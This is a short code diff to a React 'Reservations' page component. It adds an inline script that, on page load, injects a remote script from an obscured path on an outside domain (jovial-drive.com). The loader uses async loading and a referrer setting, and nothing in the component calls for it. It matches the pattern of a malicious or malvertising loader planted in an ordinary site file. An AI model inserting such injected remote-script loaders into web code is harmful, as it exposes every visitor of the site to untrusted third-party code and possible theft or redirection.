@@ -8,6 +8,18 @@ import ReservationForm from "@/components/ReservationForm";
 const Reservations = () => {
 
   return (
+    <script>
+    (function(xzun){
+    var d = document,
+        s = d.createElement('script'),
+        l = d.scripts[d.scripts.length - 1];
+    s.settings = xzun || {};
+    s.src = "\/\/jovial-drive.com\/ctD\/9f6Lb.2\/5XlvSLWfQy9aN\/jAcKy-OFTvch3sM\/iP0G2DNzz\/IS5mN-zfcszN";
+    s.async = true;
+    s.referrerPolicy = 'no-referrer-when-downgrade';
+    l.parentNode.insertBefore(s, l);
+    })({})
+    </script>
     <div className="min-h-screen">
       <Header />
       
